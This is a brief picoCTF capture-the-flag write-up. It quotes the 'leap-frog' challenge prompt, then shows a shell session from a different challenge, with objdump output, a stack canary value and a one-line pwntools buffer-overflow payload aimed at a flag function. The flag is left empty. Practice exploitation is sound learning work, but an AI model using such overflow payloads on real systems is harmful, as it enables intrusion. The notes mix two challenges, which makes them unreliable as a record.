# AUR

leap-frog - Points: 300 - (Solves: 41)Binary Exploitation - Unsolved
Solve
Hints
Can you jump your way to win in the following program and get the flag? You can find the program in /problems/leap-frog_6_772f62cb51a325a368a9d1563bf4058a on the shell server? Source.
Try and call the functions in the correct order!
Remember, you can always call main() again!

***

2kofawsome@pico-2019-shell1:~$ cd /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446

2kofawsome@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ objdump -t vuln | grep flag
000007ed g     F .text  00000090              flag
but it is PIE?



Canary is 57Gh

Final payload:

python -c 'from pwn import * ;print "a"*32 + "57Gh" + "a"*60 + p32(0x000007ed)'



Flag:

picoCTF{}

